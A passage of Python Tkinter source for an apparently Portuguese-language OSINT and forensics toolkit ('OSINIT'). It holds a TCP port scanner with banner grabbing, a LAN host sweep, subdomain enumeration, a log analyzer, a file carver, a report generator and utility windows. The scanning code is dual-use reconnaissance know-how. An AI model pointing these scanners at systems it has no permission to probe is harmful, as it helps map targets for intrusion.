            except Exception as e:
                self.after(0, lambda: self.out.insert("end", f"\nErro: {e}"))
        threading.Thread(target=worker, daemon=True).start()

    def gerar_ua(self):
        uas = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15",
            "OSINIT-Aires/1.0 (OSINT Bot)",
        ]
        import random
        ua = random.choice(uas)
        self.out.delete("1.0", "end")
        self.out.insert("1.0", f"Random UA:\n{ua}\n\nCopiado para clipboard (simulado). Use em requests para OSINT.")

    def check_cors(self):
        self.out.insert("end", "\n\nCORS Check: verifica Access-Control-Allow-Origin header\nSe *, site permite requests de qualquer origem - potencial OSINT leak")


class PortScannerTool(ToolWindow):
    def __init__(self, parent):
        super().__init__(parent, "OSINIT // Port Scanner", "700x550")
        tk.Label(self, text="PORT SCANNER - TCP", bg=BG, fg=ACCENT, font=(FONT_MONO, 12, "bold")).pack(pady=8)
        row = tk.Frame(self, bg=BG)
        row.pack(fill="x", padx=14, pady=6)
        tk.Label(row, text="Host:", bg=BG, fg=TEXT_DIM, font=(FONT_MONO, 8)).pack(side="left")
        self.host_entry = tk.Entry(row, bg=PANEL_BG, fg=TEXT, font=(FONT_MONO, 10), relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM, width=20)
        self.host_entry.pack(side="left", padx=6, fill="x", expand=True, ipady=4)
        self.host_entry.insert(0, "127.0.0.1")
        tk.Label(row, text="Portas:", bg=BG, fg=TEXT_DIM, font=(FONT_MONO, 8)).pack(side="left", padx=(10,0))
        self.ports_entry = tk.Entry(row, bg=PANEL_BG, fg=TEXT, font=(FONT_MONO, 10), relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM, width=18)
        self.ports_entry.pack(side="left", padx=6, ipady=4)
        self.ports_entry.insert(0, "21,22,80,443,8080")
        btn_row = tk.Frame(self, bg=BG)
        btn_row.pack(fill="x", padx=14, pady=6)
        for txt,cmd in [("SCAN",self.scan),("SCAN TOP 100",self.scan_top),("STOP",self.stop),("EXPORT",self.export)]:
            b = tk.Button(btn_row, text=txt, command=cmd)
            b.pack(side="left", padx=4, fill="x", expand=True, ipady=5)
            style_button(b)
        self.out = scrolledtext.ScrolledText(self, font=(FONT_MONO, 9), bg=PANEL_BG, fg=TEXT, relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM)
        self.out.pack(fill="both", expand=True, padx=14, pady=10)
        self.out.insert("1.0", "Port Scanner pronto.\n\n- Insere host (IP ou domínio)\n- Portas: 80 ou 1-1000 ou 21,22,80,443\n- SCAN verifica TCP connect\n- Use apenas em alvos com autorização!\n")
        self.stop_scan = False

    def scan(self):
        host = self.host_entry.get().strip()
        ports_str = self.ports_entry.get().strip()
        self.out.delete("1.0", "end")
        self.out.insert("1.0", f"Scanning {host} portas {ports_str}...\n")
        self.stop_scan = False
        def worker():
            try:
                import socket
                # Parse portas
                ports = []
                for part in ports_str.split(","):
                    part=part.strip()
                    if "-" in part:
                        a,b = part.split("-")
                        ports.extend(range(int(a), int(b)+1))
                    else:
                        ports.append(int(part))
                open_ports = []
                for port in ports:
                    if self.stop_scan:
                        break
                    try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.settimeout(1)
                        result = s.connect_ex((host, port))
                        if result == 0:
                            try:
                                s.send(b"HEAD / HTTP/1.0\r\n\r\n")
                                banner = s.recv(1024).decode(errors="ignore")[:100]
                            except:
                                banner = "open"
                            msg = f"[OPEN] {port}/tcp - {banner[:60]}\n"
                            open_ports.append(port)
                            self.after(0, lambda m=msg: self.out.insert("end", m))
                        s.close()
                    except Exception as e:
                        self.after(0, lambda: self.out.insert("end", f"Erro porta {port}: {e}\n"))
                self.after(0, lambda: self.out.insert("end", f"\nScan completo. Abertas: {open_ports}\n"))
            except Exception as e:
                self.after(0, lambda: self.out.insert("end", f"Erro scan: {e}\n"))
        threading.Thread(target=worker, daemon=True).start()

    def scan_top(self):
        self.ports_entry.delete(0, "end")
        self.ports_entry.insert(0, "21,22,23,25,53,80,110,111,135,139,143,443,993,995,1723,3306,3389,5432,5900,8080")
        self.scan()

    def stop(self):
        self.stop_scan = True
        self.out.insert("end", "\nStop solicitado...\n")

    def export(self):
        txt = self.out.get("1.0","end-1c")
        path = filedialog.asksaveasfilename(defaultextension=".txt", filetypes=[("TXT","*.txt")])
        if path:
            with open(path,"w",encoding="utf-8") as f:
                f.write(txt)
            messagebox.showinfo("Exportado", path)


class LogAnalyzerTool(ToolWindow):
    def __init__(self, parent):
        super().__init__(parent, "OSINIT // Log Analyzer", "700x500")
        tk.Label(self, text="LOG ANALYZER - Detecta anomalias", bg=BG, fg=ACCENT, font=(FONT_MONO, 11, "bold")).pack(pady=8)
        btn_row = tk.Frame(self, bg=BG)
        btn_row.pack(fill="x", padx=14, pady=6)
        for txt,cmd in [("📁 ABRIR LOG",self.abrir),("🔍 ANALISAR",self.analisar),("📊 ESTATÍSTICAS",self.stats)]:
            b = tk.Button(btn_row, text=txt, command=cmd)
            b.pack(side="left", padx=4, fill="x", expand=True, ipady=5)
            style_button(b)
        self.out = scrolledtext.ScrolledText(self, font=(FONT_MONO, 9), bg=PANEL_BG, fg=TEXT, relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM)
        self.out.pack(fill="both", expand=True, padx=14, pady=10)
        self.log_path = None
        self.out.insert("1.0", "Log Analyzer pronto.\nAbre ficheiro .log, .txt, auth.log, syslog, etc.\nDetecta: IPs, erros, brute force, 404, etc.\n")

    def abrir(self):
        path = filedialog.askopenfilename(filetypes=[("Logs","*.log *.txt"),("Todos","*.*")])
        if path:
            self.log_path = path
            self.out.delete("1.0", "end")
            self.out.insert("1.0", f"Log: {path}\nTamanho: {os.path.getsize(path)} bytes\nClique ANALISAR\n")

    def analisar(self):
        if not self.log_path:
            return
        self.out.delete("1.0", "end")
        self.out.insert("1.0", f"A analisar {self.log_path}...\n\n")
        def worker():
            try:
                with open(self.log_path, "r", encoding="utf-8", errors="ignore") as f:
                    content = f.read(500000)  # 500k max
                ips = re.findall(r"\b(?:\d{1,3}\.){3}\d{1,3}\b", content)
                unique_ips = list(set(ips))[:50]
                errors = content.lower().count("error") + content.lower().count("fail")
                warnings = content.lower().count("warn")
                txt = f"Linhas: {content.count(chr(10))}\nTamanho: {len(content)} chars\nIPs únicos: {len(set(ips))}\nTop IPs: {unique_ips[:10]}\nErros: {errors}\nWarnings: {warnings}\n\n--- TOP 20 LINHAS SUSPEITAS ---\n"
                suspicious = [l for l in content.splitlines() if any(x in l.lower() for x in ["error","fail","denied","unauthorized","attack","brute","sql","xss"])][:20]
                for line in suspicious:
                    txt += line[:200] + "\n"
                self.after(0, lambda: self.out.insert("end", txt))
            except Exception as e:
                self.after(0, lambda: self.out.insert("end", f"Erro: {e}"))
        threading.Thread(target=worker, daemon=True).start()

    def stats(self):
        self.out.insert("end", "\n\nEstatísticas avançadas em desenvolvimento...\n")


class TimelineBuilderTool(ToolWindow):
    def __init__(self, parent):
        super().__init__(parent, "OSINIT // Timeline Builder", "650x500")
        tk.Label(self, text="TIMELINE BUILDER FORENSE", bg=BG, fg=ACCENT, font=(FONT_MONO, 11, "bold")).pack(pady=8)
        self.entries = []
        form = tk.Frame(self, bg=BG)
        form.pack(fill="x", padx=14, pady=6)
        tk.Label(form, text="Data/Hora:", bg=BG, fg=TEXT_DIM, font=(FONT_MONO, 8)).pack(side="left")
        self.date_entry = tk.Entry(form, bg=PANEL_BG, fg=TEXT, font=(FONT_MONO, 9), relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM, width=16)
        self.date_entry.pack(side="left", padx=6, ipady=4)
        self.date_entry.insert(0, datetime.datetime.now().strftime("%Y-%m-%d %H:%M"))
        tk.Label(form, text="Evento:", bg=BG, fg=TEXT_DIM, font=(FONT_MONO, 8)).pack(side="left", padx=(10,0))
        self.event_entry = tk.Entry(form, bg=PANEL_BG, fg=TEXT, font=(FONT_MONO, 9), relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM)
        self.event_entry.pack(side="left", fill="x", expand=True, padx=6, ipady=4)
        self.event_entry.insert(0, "Ex: Login suspeito IP 1.2.3.4")
        btn_row = tk.Frame(self, bg=BG)
        btn_row.pack(fill="x", padx=14, pady=6)
        for txt,cmd in [("➕ ADICIONAR",self.add),("📊 GERAR TIMELINE",self.gerar),("💾 EXPORTAR",self.export),("🧹 LIMPAR",self.limpar)]:
            b = tk.Button(btn_row, text=txt, command=cmd)
            b.pack(side="left", padx=4, fill="x", expand=True, ipady=5)
            style_button(b)
        self.out = scrolledtext.ScrolledText(self, font=(FONT_MONO, 9), bg=PANEL_BG, fg=TEXT, relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM)
        self.out.pack(fill="both", expand=True, padx=14, pady=10)
        self.out.insert("1.0", "Timeline Builder pronto.\nAdiciona eventos com data/hora para criar linha temporal forense.\nÚtil para casos: sequência de ataques, movimentação suspeita, etc.\n")

    def add(self):
        date = self.date_entry.get().strip()
        event = self.event_entry.get().strip()
        if not event:
            return
        self.entries.append((date, event))
        self.entries.sort(key=lambda x: x[0])
        self.gerar()
        self.event_entry.delete(0, "end")

    def gerar(self):
        self.out.delete("1.0", "end")
        self.out.insert("1.0", "══ TIMELINE FORENSE ══\n\n")
        for date, event in self.entries:
            self.out.insert("end", f"{date} | {event}\n")

    def export(self):
        txt = self.out.get("1.0","end-1c")
        path = filedialog.asksaveasfilename(defaultextension=".txt", filetypes=[("TXT","*.txt"),("CSV","*.csv")])
        if path:
            with open(path,"w",encoding="utf-8") as f:
                f.write(txt)
            messagebox.showinfo("Exportado", path)

    def limpar(self):
        self.entries = []
        self.out.delete("1.0", "end")


class FileCarverTool(ToolWindow):
    def __init__(self, parent):
        super().__init__(parent, "OSINIT // File Carver", "600x450")
        tk.Label(self, text="FILE CARVER - Recupera ficheiros por assinatura", bg=BG, fg=ACCENT, font=(FONT_MONO, 11, "bold")).pack(pady=8)
        tk.Label(self, text="Procura headers JPG, PNG, PDF, ZIP em dump bruto", bg=BG, fg=TEXT_DIM, font=(FONT_MONO, 8)).pack()
        btn_row = tk.Frame(self, bg=BG)
        btn_row.pack(fill="x", padx=14, pady=10)
        for txt,cmd in [("📁 SELECIONAR DUMP",self.select_dump),("🔍 CARVE",self.carve)]:
            b = tk.Button(btn_row, text=txt, command=cmd)
            b.pack(side="left", padx=4, fill="x", expand=True, ipady=6)
            style_button(b)
        self.out = scrolledtext.ScrolledText(self, font=(FONT_MONO, 9), bg=PANEL_BG, fg=TEXT, relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM)
        self.out.pack(fill="both", expand=True, padx=14, pady=10)
        self.dump_path = None
        self.out.insert("1.0", "File Carver pronto.\nSeleciona ficheiro dump (imagem de disco, RAM, etc)\nProcura assinaturas: \n- JPG: FF D8 FF\n- PNG: 89 50 4E 47\n- PDF: 25 50 44 46\n- ZIP: 50 4B 03 04\n")

    def select_dump(self):
        path = filedialog.askopenfilename()
        if path:
            self.dump_path = path
            self.out.insert("end", f"\nDump: {path} ({os.path.getsize(path)} bytes)\n")

    def carve(self):
        if not self.dump_path:
            return
        self.out.insert("end", "\nCarving...\n")
        def worker():
            try:
                with open(self.dump_path, "rb") as f:
                    data = f.read(10*1024*1024)  # 10MB max demo
                sigs = {b"\xff\xd8\xff": "JPG", b"\x89PNG": "PNG", b"%PDF": "PDF", b"PK\x03\x04": "ZIP"}
                found = []
                for sig, name in sigs.items():
                    idx = 0
                    while True:
                        idx = data.find(sig.encode() if isinstance(sig, str) else sig, idx)
                        if idx == -1:
                            break
                        found.append((idx, name))
                        idx += 1
                        if len(found)>100:
                            break
                txt = f"\nEncontrados {len(found)} ficheiros potenciais:\n"
                for offset, typ in found[:20]:
                    txt += f"Offset {offset}: {typ}\n"
                self.after(0, lambda: self.out.insert("end", txt))
            except Exception as e:
                self.after(0, lambda: self.out.insert("end", f"Erro: {e}\n"))
        threading.Thread(target=worker, daemon=True).start()


class RegistryViewerTool(ToolWindow):
    def __init__(self, parent):
        super().__init__(parent, "OSINIT // Registry Viewer", "600x400")
        tk.Label(self, text="REGISTRY VIEWER - Analisa hive offline", bg=BG, fg=ACCENT, font=(FONT_MONO, 11, "bold")).pack(pady=8)
        self.out = scrolledtext.ScrolledText(self, font=(FONT_MONO, 9), bg=PANEL_BG, fg=TEXT, relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM)
        self.out.pack(fill="both", expand=True, padx=14, pady=10)
        self.out.insert("1.0", "Registry Viewer pronto.\n\nFuncionalidade: abre ficheiros NTUSER.DAT, SYSTEM, SOFTWARE, SAM\nRequer python-registry ou offline registry parser\n\nPara investigação: Run keys, USB history, RecentDocs, etc.\n\nEm desenvolvimento - usa Autopsy para completo.")


class NetworkScannerTool(ToolWindow):
    def __init__(self, parent):
        super().__init__(parent, "OSINIT // Network Scanner", "650x500")
        tk.Label(self, text="NETWORK SCANNER - Descobre hosts LAN", bg=BG, fg=ACCENT, font=(FONT_MONO, 11, "bold")).pack(pady=8)
        row = tk.Frame(self, bg=BG)
        row.pack(fill="x", padx=14, pady=6)
        tk.Label(row, text="Rede:", bg=BG, fg=TEXT_DIM, font=(FONT_MONO, 8)).pack(side="left")
        self.net_entry = tk.Entry(row, bg=PANEL_BG, fg=TEXT, font=(FONT_MONO, 10), relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM)
        self.net_entry.pack(side="left", fill="x", expand=True, padx=6, ipady=4)
        self.net_entry.insert(0, "192.168.1.0/24")
        btn_row = tk.Frame(self, bg=BG)
        btn_row.pack(fill="x", padx=14, pady=6)
        for txt,cmd in [("SCAN LAN",self.scan),("MEU IP",self.my_ip)]:
            b = tk.Button(btn_row, text=txt, command=cmd)
            b.pack(side="left", padx=4, fill="x", expand=True, ipady=5)
            style_button(b)
        self.out = scrolledtext.ScrolledText(self, font=(FONT_MONO, 9), bg=PANEL_BG, fg=TEXT, relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM)
        self.out.pack(fill="both", expand=True, padx=14, pady=10)
        self.out.insert("1.0", "Network Scanner pronto.\nInsere rede ex: 192.168.1.0/24\nFaz ping sweep + tenta hostname\n")

    def my_ip(self):
        try:
            s=socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8",80))
            ip=s.getsockname()[0]
            s.close()
            self.out.delete("1.0", "end")
            self.out.insert("1.0", f"Meu IP: {ip}\nRede sugerida: {'.'.join(ip.split('.')[:3])}.0/24")
            self.net_entry.delete(0, "end")
            self.net_entry.insert(0, '.'.join(ip.split('.')[:3])+".0/24")
        except Exception as e:
            self.out.insert("end", f"Erro: {e}")

    def scan(self):
        net = self.net_entry.get().strip()
        self.out.delete("1.0", "end")
        self.out.insert("1.0", f"Scanning {net}...\n")
        def worker():
            try:
                base = net.split("/")[0]
                base_parts = base.split(".")
                prefix = ".".join(base_parts[:3]) + "."
                for i in range(1, 30):  # scan 1-30 demo
                    ip = prefix + str(i)
                    try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.settimeout(0.3)
                        # tenta porta 80, 445
                        open_ports = []
                        for p in [80,443,22,445,3389]:
                            try:
                                s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                                s2.settimeout(0.2)
                                if s2.connect_ex((ip, p)) == 0:
                                    open_ports.append(str(p))
                                s2.close()
                            except:
                                pass
                        if open_ports:
                            msg = f"[UP] {ip} ports {','.join(open_ports)}\n"
                            self.after(0, lambda m=msg: self.out.insert("end", m))
                    except:
                        pass
                self.after(0, lambda: self.out.insert("end", "\nScan parcial 1-30 completo. Para scan completo usa nmap.\n"))
            except Exception as e:
                self.after(0, lambda: self.out.insert("end", f"Erro: {e}"))
        threading.Thread(target=worker, daemon=True).start()


class SubdomainFinderTool(ToolWindow):
    def __init__(self, parent):
        super().__init__(parent, "OSINIT // Subdomain Finder", "650x500")
        tk.Label(self, text="SUBDOMAIN FINDER", bg=BG, fg=ACCENT, font=(FONT_MONO, 11, "bold")).pack(pady=8)
        row = tk.Frame(self, bg=BG)
        row.pack(fill="x", padx=14, pady=6)
        tk.Label(row, text="Domínio:", bg=BG, fg=TEXT_DIM, font=(FONT_MONO, 8)).pack(side="left")
        self.domain_entry = tk.Entry(row, bg=PANEL_BG, fg=TEXT, font=(FONT_MONO, 10), relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM)
        self.domain_entry.pack(side="left", fill="x", expand=True, padx=6, ipady=4)
        self.domain_entry.insert(0, "google.com")
        btn_row = tk.Frame(self, bg=BG)
        btn_row.pack(fill="x", padx=14, pady=6)
        for txt,cmd in [("ENUMERAR",self.enum),("CERT LOGS",self.cert_logs),("ABRIR SHODAN",self.shodan)]:
            b = tk.Button(btn_row, text=txt, command=cmd)
            b.pack(side="left", padx=4, fill="x", expand=True, ipady=5)
            style_button(b)
        self.out = scrolledtext.ScrolledText(self, font=(FONT_MONO, 9), bg=PANEL_BG, fg=TEXT, relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM)
        self.out.pack(fill="both", expand=True, padx=14, pady=10)
        self.out.insert("1.0", "Subdomain Finder pronto.\n\nEnumera via wordlist + cert transparency logs\n")

    def enum(self):
        domain = self.domain_entry.get().strip()
        self.out.delete("1.0", "end")
        self.out.insert("1.0", f"Enumerando subdomínios de {domain}...\n")
        def worker():
            subs = ["www","mail","ftp","admin","api","dev","test","portal","vpn","ns1","ns2","blog","shop","app"]
            found = []
            for sub in subs:
                host = f"{sub}.{domain}"
                try:
                    import socket
                    ip = socket.gethostbyname(host)
                    found.append(f"{host} -> {ip}")
                    self.after(0, lambda h=host, i=ip: self.out.insert("end", f"[FOUND] {h} -> {i}\n"))
                except:
                    pass
            self.after(0, lambda: self.out.insert("end", f"\nEncontrados: {len(found)} (wordlist básica)\nPara completo usa Amass/Sublist3r\n"))
        threading.Thread(target=worker, daemon=True).start()

    def cert_logs(self):
        domain = self.domain_entry.get().strip()
        webbrowser.open(f"https://crt.sh/?q=%25.{domain}")

    def shodan(self):
        domain = self.domain_entry.get().strip()
        webbrowser.open(f"https://www.shodan.io/search?query={domain}")


class ThreatIntelTool(ToolWindow):
    def __init__(self, parent):
        super().__init__(parent, "OSINIT // Threat Intel", "650x500")
        tk.Label(self, text="THREAT INTEL - VirusTotal, AbuseIP, Shodan", bg=BG, fg=ACCENT, font=(FONT_MONO, 11, "bold")).pack(pady=8)
        row = tk.Frame(self, bg=BG)
        row.pack(fill="x", padx=14, pady=6)
        self.entry = tk.Entry(row, bg=PANEL_BG, fg=TEXT, font=(FONT_MONO, 10), relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM)
        self.entry.pack(side="left", fill="x", expand=True, padx=6, ipady=4)
        self.entry.insert(0, "8.8.8.8")
        btn_row = tk.Frame(self, bg=BG)
        btn_row.pack(fill="x", padx=14, pady=6)
        for txt,url_template in [("VirusTotal", "https://www.virustotal.com/gui/ip-address/"), ("AbuseIP", "https://www.abuseipdb.com/check/"), ("Shodan", "https://www.shodan.io/host/"), ("GreyNoise", "https://viz.greynoise.io/ip/")]:
            b = tk.Button(btn_row, text=txt, command=lambda u=url_template: self.open_intel(u))
            b.pack(side="left", padx=4, fill="x", expand=True, ipady=5)
            style_button(b)
        self.out = scrolledtext.ScrolledText(self, font=(FONT_MONO, 9), bg=PANEL_BG, fg=TEXT, relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM)
        self.out.pack(fill="both", expand=True, padx=14, pady=10)
        self.out.insert("1.0", "Threat Intel pronto.\nInsere IP, domínio ou hash e abre nos portais.\n\nVirusTotal - verifica malicioso\nAbuseIPDB - reports abuso\nShodan - serviços expostos\nGreyNoise - noise vs threat\n")

    def open_intel(self, base_url):
        val = self.entry.get().strip()
        webbrowser.open(base_url + val)


class ReportGeneratorTool(ToolWindow):
    def __init__(self, parent):
        super().__init__(parent, "OSINIT // Gerador de Relatório", "650x600")
        tk.Label(self, text="GERADOR DE RELATÓRIO DE CASO", bg=BG, fg=ACCENT, font=(FONT_MONO, 11, "bold")).pack(pady=8)
        row = tk.Frame(self, bg=BG)
        row.pack(fill="x", padx=14, pady=6)
        tk.Label(row, text="Caso:", bg=BG, fg=TEXT_DIM, font=(FONT_MONO, 8)).pack(side="left")
        self.caso_var = tk.StringVar(value="Sem caso")
        self.caso_menu = tk.OptionMenu(row, self.caso_var, "Sem caso")
        self.caso_menu.configure(bg=BTN_BG, fg=ACCENT, relief="flat", highlightthickness=0, font=(FONT_MONO, 9))
        self.caso_menu["menu"].configure(bg=PANEL_BG, fg=TEXT)
        self.caso_menu.pack(side="left", padx=6, fill="x", expand=True)
        self.refresh_casos()
        btn_row = tk.Frame(self, bg=BG)
        btn_row.pack(fill="x", padx=14, pady=6)
        for txt,cmd in [("GERAR HTML",lambda: self.gerar("html")),("GERAR TXT",lambda: self.gerar("txt")),("ABRIR PASTA",self.abrir_pasta)]:
            b = tk.Button(btn_row, text=txt, command=cmd)
            b.pack(side="left", padx=4, fill="x", expand=True, ipady=5)
            style_button(b)
        self.out = scrolledtext.ScrolledText(self, font=(FONT_MONO, 9), bg=PANEL_BG, fg=TEXT, relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM)
        self.out.pack(fill="both", expand=True, padx=14, pady=10)
        self.out.insert("1.0", "Gerador de relatório pronto.\nSeleciona caso e gera relatório HTML/TXT com:\n- Info caso\n- Clientes\n- Registos OSINT\n- Timeline\n- Hashes e metadados\n")

    def refresh_casos(self):
        casos = load_json(CASOS_FILE)
        menu = self.caso_menu["menu"]
        menu.delete(0, "end")
        titles = [c.get("titulo","Sem titulo") for c in casos] if casos else ["Sem caso"]
        for t in titles:
            menu.add_command(label=t, command=lambda v=t: self.caso_var.set(v))
        if titles:
            self.caso_var.set(titles[0])

    def gerar(self, fmt):
        caso_titulo = self.caso_var.get()
        if caso_titulo == "Sem caso":
            messagebox.showwarning("Aviso","Seleciona caso")
            return
        casos = load_json(CASOS_FILE)
        caso = next((c for c in casos if c.get("titulo")==caso_titulo), None)
        buscas = [b for b in load_json(BUSCAS_FILE) if b.get("caso")==caso_titulo]
        self.out.delete("1.0", "end")
        self.out.insert("1.0", f"Gerando relatório {fmt} para {caso_titulo}...\nRegistos: {len(buscas)}\n")
        try:
            if fmt == "html":
                html = f"<html><head><meta charset='utf-8'><title>{caso_titulo}</title></head><body style='background:#05080d;color:#d8f8ff;font-family:Consolas;padding:20px'>"
                html += f"<h1 style='color:#00e5ff'>OSINIT - Relatório - {caso_titulo}</h1>"
                html += f"<p>Gerado: {datetime.datetime.now()}</p>"
                if caso:
                    html += f"<h2>Caso</h2><pre>{json.dumps(caso, indent=2, ensure_ascii=False)}</pre>"
                html += f"<h2>Registos ({len(buscas)})</h2>"
                for b in buscas:
                    html += f"<div style='border:1px solid #0a2e36;padding:8px;margin:6px'><b>{b.get('data')}</b> - {b.get('fonte')}<br>{b.get('descricao')}</div>"
                html += "</body></html>"
                path = os.path.join(BASE_DIR, f"relatorio_{caso_titulo.replace(' ','_')}.html")
                with open(path,"w",encoding="utf-8") as f:
                    f.write(html)
                self.out.insert("end", f"\nHTML guardado: {path}\n")
                webbrowser.open(path)
            else:
                txt = f"OSINIT - RELATÓRIO - {caso_titulo}\nGerado: {datetime.datetime.now()}\n\nCASO:\n{json.dumps(caso, indent=2, ensure_ascii=False) if caso else 'N/A'}\n\nREGISTOS ({len(buscas)}):\n"
                for b in buscas:
                    txt += f"{b.get('data')} | {b.get('fonte')} | {b.get('descricao')}\n"
                path = os.path.join(BASE_DIR, f"relatorio_{caso_titulo.replace(' ','_')}.txt")
                with open(path,"w",encoding="utf-8") as f:
                    f.write(txt)
                self.out.insert("end", f"\nTXT guardado: {path}\n")
        except Exception as e:
            self.out.insert("end", f"Erro: {e}")

    def abrir_pasta(self):
        try:
            if platform.system() == "Windows":
                os.startfile(BASE_DIR)
            elif platform.system() == "Darwin":
                subprocess.Popen(["open", BASE_DIR])
            else:
                subprocess.Popen(["xdg-open", BASE_DIR])
        except Exception as e:
            messagebox.showerror("Erro", str(e))


class Calculator(ToolWindow):
    def __init__(self, parent):
        super().__init__(parent, "OSINIT // Calculadora", "300x420")
        self.expression = ""
        self.display_var = tk.StringVar()
        display = tk.Entry(
            self,
            textvariable=self.display_var,
            font=(FONT_MONO, 20),
            justify="right",
            bg=PANEL_BG,
            fg=ACCENT,
            relief="flat",
            insertbackground=ACCENT,
            highlightthickness=1,
            highlightbackground=ACCENT_DIM,
            highlightcolor=ACCENT)
        display.pack(fill="x", padx=14, pady=14, ipady=14)
        linhas = [["7", "8", "9", "/"], ["4", "5", "6", "*"], ["1", "2", "3", "-"], ["C", "0", "=", "+"]]
        for linha in linhas:
            frame = tk.Frame(self, bg=BG)
            frame.pack(expand=True, fill="both", padx=14)
            for char in linha:
                b = tk.Button(frame, text=char, command=lambda c=char: self.on_click(c))
                b.pack(side="left", expand=True, fill="both", padx=3, pady=3)
                style_button(b)
                b.configure(font=(FONT_MONO, 14, "bold"))

    def on_click(self, char):
        if char == "C":
            self.expression = ""
        elif char == "=":
            try:
                self.expression = str(safe_eval(self.expression))
            except Exception:
                self.expression = "Erro"
        else:
            self.expression += char
        self.display_var.set(self.expression)


class Notes(ToolWindow):
    def __init__(self, parent):
        super().__init__(parent, "OSINIT // Notas Gerais", "420x440")
        self.text_area = scrolledtext.ScrolledText(
            self,
            font=(FONT_MONO, 11),
            wrap="word",
            bg=PANEL_BG,
            fg=TEXT,
            insertbackground=ACCENT,
            relief="flat",
            highlightthickness=1,
            highlightbackground=ACCENT_DIM)
        self.text_area.pack(expand=True, fill="both", padx=14, pady=14)
        if os.path.exists(NOTES_FILE):
            with open(NOTES_FILE, "r", encoding="utf-8") as f:
                self.text_area.insert("1.0", f.read())
        btn = tk.Button(self, text="💾  GUARDAR", command=self.save)
        btn.pack(fill="x", padx=14, pady=(0, 14), ipady=8)
        style_button(btn)

    def save(self):
        with open(NOTES_FILE, "w", encoding="utf-8") as f:
            f.write(self.text_area.get("1.0", "end-1c"))
        messagebox.showinfo("Guardado", "Notas guardadas com sucesso.")


class Converter(ToolWindow):
    UNITS = {
        "Km → Milhas": lambda v: v * 0.621371,
        "Milhas → Km": lambda v: v / 0.621371,
        "Kg → Lb": lambda v: v * 2.20462,
        "Lb → Kg": lambda v: v / 2.20462,
        "°C → °F": lambda v: v * 9 / 5 + 32,
        "°F → °C": lambda v: (v - 32) * 5 / 9,
    }

    def __init__(self, parent):
        super().__init__(parent, "OSINIT // Conversor", "320x300")
        tk.Label(self, text="VALOR", bg=BG, fg=ACCENT, font=(FONT_MONO, 9, "bold")).pack(pady=(18, 4))
        self.value_entry = tk.Entry(
            self,
            font=(FONT_MONO, 12),
            bg=PANEL_BG,
            fg=TEXT,
            insertbackground=ACCENT,
            relief="flat",
            justify="center",
            highlightthickness=1,
            highlightbackground=ACCENT_DIM)
        self.value_entry.pack(ipady=8, padx=40, fill="x")
        self.selected = tk.StringVar(value=list(self.UNITS.keys())[0])
        menu = tk.OptionMenu(self, self.selected, *self.UNITS.keys())
        menu.configure(
            bg=BTN_BG, fg=ACCENT, activebackground=ACCENT_DIM, relief="flat", highlightthickness=0, font=(FONT_MONO, 10)
        )
        menu["menu"].configure(bg=PANEL_BG, fg=TEXT)
        menu.pack(pady=14, padx=40, fill="x")
        btn = tk.Button(self, text="▶  CONVERTER", command=self.convert)
        btn.pack(padx=40, fill="x", ipady=8)
        style_button(btn)
        self.result_label = tk.Label(self, text="", bg=BG, fg=ACCENT, font=(FONT_MONO, 13, "bold"))
        self.result_label.pack(pady=16)

    def convert(self):
        try:
            value = float(self.value_entry.get())
            result = self.UNITS[self.selected.get()](value)
            self.result_label.config(text=f"= {result:.2f}")
        except ValueError:
            messagebox.showerror("Erro", "Introduz um número válido.")


class Todo(ToolWindow):
    def __init__(self, parent):
        super().__init__(parent, "OSINIT // Tarefas", "340x440")
        self.tasks = load_json(TODO_FILE)
        entry_frame = tk.Frame(self, bg=BG)
        entry_frame.pack(fill="x", padx=14, pady=14)
        self.task_entry = tk.Entry(
            entry_frame,
            font=(FONT_MONO, 11),
            bg=PANEL_BG,
            fg=TEXT,
            insertbackground=ACCENT,
            relief="flat",
            highlightthickness=1,
            highlightbackground=ACCENT_DIM)
        self.task_entry.pack(side="left", expand=True, fill="x", ipady=6)
        btn_add = tk.Button(entry_frame, text="+", command=self.add_task, width=3)
        btn_add.pack(side="left", padx=(6, 0))
        style_button(btn_add)
        self.listbox = tk.Listbox(
            self,
            font=(FONT_MONO, 11),
            bg=PANEL_BG,
            fg=TEXT,
            selectbackground=ACCENT_DIM,
            relief="flat",
            highlightthickness=1,
            highlightbackground=ACCENT_DIM)
        self.listbox.pack(expand=True, fill="both", padx=14, pady=(0, 10))
        btn_remove = tk.Button(self, text="🗑  REMOVER SELECIONADA", command=self.remove_task)
        btn_remove.pack(fill="x", padx=14, pady=(0, 14), ipady=8)
        style_button(btn_remove)
        self.refresh_list()

    def add_task(self):
        task = self.task_entry.get().strip()
        if task:
            self.tasks.append(task)
            self.task_entry.delete(0, "end")
            save_json(TODO_FILE, self.tasks)
            self.refresh_list()

    def remove_task(self):
        sel = self.listbox.curselection()
        if sel:
            del self.tasks[sel[0]]
            save_json(TODO_FILE, self.tasks)
            self.refresh_list()

    def refresh_list(self):
        self.listbox.delete(0, "end")
        for task in self.tasks:
            self.listbox.insert("end", f"▸ {task}")


class SystemInfo(ToolWindow):
    def __init__(self, parent):
